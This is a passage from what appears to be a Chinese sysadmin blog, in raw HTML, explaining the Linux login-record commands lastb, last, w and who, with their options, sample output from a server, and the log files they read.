class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><br><span class="hljs-keyword">btmp-20220801 </span><span class="hljs-keyword">begins </span>Fri <span class="hljs-keyword">Jul </span> <span class="hljs-number">1</span> <span class="hljs-number">03</span>:<span class="hljs-number">55</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure><h4 id="lastb-n-num-lastb-nnum-显示指定行数"><a href="#lastb-n-num-lastb-nnum-显示指定行数" class="headerlink" title="lastb -n num&#x2F;lastb -nnum 显示指定行数"></a>lastb -n num&#x2F;lastb -nnum 显示指定行数</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n 2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br>[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br></code></pre></td></tr></table></figure><h4 id="lastb-R-不显示主机名或IP"><a href="#lastb-R-不显示主机名或IP" class="headerlink" title="lastb -R 不显示主机名或IP"></a>lastb -R 不显示主机名或IP</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-R</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息"><a href="#lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息" class="headerlink" title="lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息"></a>lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-x</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192.46</span><span class="hljs-selector-class">.210</span><span class="hljs-selector-class">.172</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-username-显示指定用户的记录"><a href="#lastb-username-显示指定用户的记录" class="headerlink" title="lastb username 显示指定用户的记录"></a>lastb username 显示指定用户的记录</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>  <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-tty-pts-显示指定终端的记录"><a href="#lastb-tty-pts-显示指定终端的记录" class="headerlink" title="lastb tty&#x2F;pts 显示指定终端的记录"></a>lastb tty&#x2F;pts 显示指定终端的记录</h4><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb pts/1<br><span class="hljs-keyword">test     </span>pts/1                         Thu Aug 18 23:11 - 23:11  (00:00)<br><br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><p>tty可以缩写 lastb 0 &#x3D;&#x3D; lastb tty0</p><h4 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h4><p>&#x2F;var&#x2F;log&#x2F;btmp</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br>-rw------- 1 root utmp 52224 8月  25 04:36 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>last</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>w&amp;who</title>
    <link href="/2024/03/15/yunwei/commands/w&amp;who/"/>
    <url>/2024/03/15/yunwei/commands/w&amp;who/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="w"><a href="#w" class="headerlink" title="w"></a>w</h1><p>显示当前登录系统的用户信息以及当前正在做什么</p><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/var/log# w<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">06</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">00</span>, <span class="hljs-number">0</span>.<span class="hljs-number">01</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>:<span class="hljs-number">32</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">13</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w<br></code></pre></td></tr></table></figure><p> 14:17:40 up 209 days,  3:06,  2 users,  load average: 0.00, 0.01, 0.00</p><p>当前时间  运行时长  当前用户登录个数  当前系统负载 1分钟 5分钟 15分钟</p><p>USER ：登录用户</p><p>TTY：登录方式，pts 远程登录  tty 本地登录</p><p>FROM：登录来源IP</p><p>LOGIN@：登录时间</p><p>IDLE：闲置时间，也就是终端多久没有操作</p><p>JCPU：对应终端所有进程占用CPU时间，不包含过去已经完成的后台任务，但是包含当前正在运行的后台任务（The JCPU time is the time used by all processes attached to the tty.  It does not include past background jobs, but  does  include currently running background jobs.）</p><p>PCPU：对应终端当前进程占用CPU时间</p><p>WHAT：当前登录用户操作</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>w [options] user […]</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="f-不显示登录来源"><a href="#f-不显示登录来源" class="headerlink" title="-f 不显示登录来源"></a>-f 不显示登录来源</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -f</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>        LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">04m</span>  <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>     <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">4.00s</span>  <span class="hljs-number">0.55s</span>  <span class="hljs-number">0.55s</span> -bash<br>root     pts/<span class="hljs-number">1</span>     <span class="hljs-number">23</span>:<span class="hljs-number">47</span>    <span class="hljs-number">8</span>:<span class="hljs-number">52</span>   <span class="hljs-number">0.00s</span>  <span class="hljs-number">0.00s</span> -bash<br></code></pre></td></tr></table></figure><h4 id="s-精简显示"><a href="#s-精简显示" class="headerlink" title="-s 精简显示"></a>-s 精简显示</h4><p>登录用户名，登录方式，登录来源IP，闲置时间，当前操作</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -s</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">52</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM              IDLE WHAT<br>root     tty1                       <span class="hljs-number">1</span>:<span class="hljs-number">04m</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">4.00s</span> -bash<br>root     pts/<span class="hljs-number">1</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">9</span>:<span class="hljs-number">16</span>  -bash<br></code></pre></td></tr></table></figure><h4 id="h-不显示标题字段"><a href="#h-不显示标题字段" class="headerlink" title="-h 不显示标题字段"></a>-h 不显示标题字段</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># w -h</span><br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">06</span>m  <span class="hljs-number">0.10</span>s  <span class="hljs-number">0.10</span>s -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span><span class="hljs-number">.205</span><span class="hljs-number">.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">2.00</span>s  <span class="hljs-number">0.55</span>s  <span class="hljs-number">0.55</span>s -bash<br>root     pts/<span class="hljs-number">1</span>    <span class="hljs-number">125.33</span><span class="hljs-number">.205</span><span class="hljs-number">.114</span>   <span class="hljs-number">23</span>:<span class="hljs-number">47</span>   <span class="hljs-number">10</span>:<span class="hljs-number">42</span>   <span class="hljs-number">0.00</span>s  <span class="hljs-number">0.00</span>s -bash<br></code></pre></td></tr></table></figure><h4 id="i-显示以主机名登录的"><a href="#i-显示以主机名登录的" class="headerlink" title="-i 显示以主机名登录的"></a>-i 显示以主机名登录的</h4><h4 id="V-显示命令版本"><a href="#V-显示命令版本" class="headerlink" title="-V 显示命令版本"></a>-V 显示命令版本</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w -V<br><span class="hljs-attribute">w</span> from procps-ng <span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">17</span><br></code></pre></td></tr></table></figure><h4 id="user-显示指定用户名"><a href="#user-显示指定用户名" class="headerlink" title="user 显示指定用户名"></a>user 显示指定用户名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w root<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">49</span>:<span class="hljs-number">39</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">38</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">4</span>:<span class="hljs-number">08</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>   <span class="hljs-number">27</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">14</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s sh<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">19</span>    <span class="hljs-number">3</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">05</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w root<br></code></pre></td></tr></table></figure><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><h3 id="登录信息-var-run-utmp"><a href="#登录信息-var-run-utmp" class="headerlink" title="登录信息 &#x2F;var&#x2F;run&#x2F;utmp"></a>登录信息 &#x2F;var&#x2F;run&#x2F;utmp</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">run</span>]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br>-rw-rw-r-- 1 root utmp 4224 8月  25 09:31 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br></code></pre></td></tr></table></figure><h3 id="进程信息-proc"><a href="#进程信息-proc" class="headerlink" title="进程信息 &#x2F;proc"></a>进程信息 &#x2F;proc</h3><h1 id="who"><a href="#who" class="headerlink" title="who"></a>who</h1><p>显示当前登录用户</p><h2 id="参数解释-1"><a href="#参数解释-1" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><p>登录用户名</p><p>登录方式：pts 远程登录  tty 本地登录</p><p>登录时间及登录来源IP</p><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><p>who [OPTION]… [ FILE | ARG1 ARG2 ]</p><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><h4 id="a-–all-显示所有"><a href="#a-–all-显示所有" class="headerlink" title="-a –all 显示所有"></a>-a –all 显示所有</h4><p>等同于  -b -d –login -p -r -t -T -u</p><h4 id="b-–boot-系统最近启动时间"><a href="#b-–boot-系统最近启动时间" class="headerlink" title="-b –boot 系统最近启动时间"></a>-b –boot 系统最近启动时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -b<br>         <span class="hljs-attribute">system</span> boot  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="d-–dead-输出-dead-precess"><a href="#d-–dead-输出-dead-precess" class="headerlink" title="-d –dead 输出 dead precess"></a>-d –dead 输出 dead precess</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@iZbp1191gh7vw52537lyxrZ:/<span class="hljs-comment"># who -d</span><br>         pts<span class="hljs-regexp">/3        2023-08-16 12:14            122616 id=ts/</span><span class="hljs-number">3</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/4        2023-07-11 02:37              5696 id=ts/</span><span class="hljs-number">4</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/5        2023-07-11 03:22              5983 id=ts/</span><span class="hljs-number">5</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="H-–heading-输出字段标题"><a href="#H-–heading-输出字段标题" class="headerlink" title="-H –heading 输出字段标题"></a>-H –heading 输出字段标题</h4><h4 id="–ips-输出登录主机hostname对应的ip"><a href="#–ips-输出登录主机hostname对应的ip" class="headerlink" title="–ips 输出登录主机hostname对应的ip"></a>–ips 输出登录主机hostname对应的ip</h4><p>等同于 –lookup </p><p>规范化存储IP，如果可用，就不存储主机名</p><h4 id="l-–login-输出系统登录进程"><a href="#l-–login-输出系统登录进程" class="headerlink" title="-l –login 输出系统登录进程"></a>-l –login 输出系统登录进程</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -l<br><span class="hljs-attribute">LOGIN</span>    ttyS0        <span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">25</span> <span class="hljs-number">10</span>:<span class="hljs-number">21</span>            <span class="hljs-number">306392</span> id=tyS0<br><span class="hljs-attribute">LOGIN</span>    tty1         <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span>               <span class="hljs-number">821</span> id=tty1<br></code></pre></td></tr></table></figure><h4 id="m-只显示-stdin-关联的用户名和主机名"><a href="#m-只显示-stdin-关联的用户名和主机名" class="headerlink" title="-m  只显示 stdin 关联的用户名和主机名"></a>-m  只显示 stdin 关联的用户名和主机名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -m<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="p-–process-输出初始化衍生的进程"><a href="#p-–process-输出初始化衍生的进程" class="headerlink" title="-p –process 输出初始化衍生的进程"></a>-p –process 输出初始化衍生的进程</h4><h4 id="q-–count-输出当前登录的所有用户名和数量"><a href="#q-–count-输出当前登录的所有用户名和数量" class="headerlink" title="-q –count 输出当前登录的所有用户名和数量"></a>-q –count 输出当前登录的所有用户名和数量</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span 